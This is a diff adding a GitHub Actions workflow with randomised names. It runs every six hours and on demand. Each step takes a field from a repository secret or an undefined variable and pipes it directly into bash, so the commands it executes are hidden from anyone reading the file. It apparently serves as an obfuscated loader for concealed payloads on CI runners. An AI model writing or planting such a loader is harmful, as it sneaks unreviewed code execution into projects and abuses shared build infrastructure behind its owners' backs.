@@ -1,0 +1,27 @@
+name: longpoli3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: longpoli3456
+        env:
+          h9: ${{ secrets.h9 }}
+        run: |
+          echo $h9 | jq -r .egjq56 | /bin/bash
+          echo $x6 | jq -r .sxml0 | /bin/bash
+          echo $hgni5 | jq -r .cft0362 | /bin/bash
+          echo $zg84646 | jq -r .bffa083 | /bin/bash
+          echo $qhhyd6947 | jq -r .masc0280 | /bin/bash
+          echo $iq436 | jq -r .alw5283 | /bin/bash
+          echo $yq88 | jq -r .unrgn2938 | /bin/bash
+          echo $gnxp36 | jq -r .gkog7373 | /bin/bash
+          echo $vp57 | jq -r .zmew6414 | /bin/bash
+          echo $pjwb3446 | jq -r .s24336 | /bin/bash
+
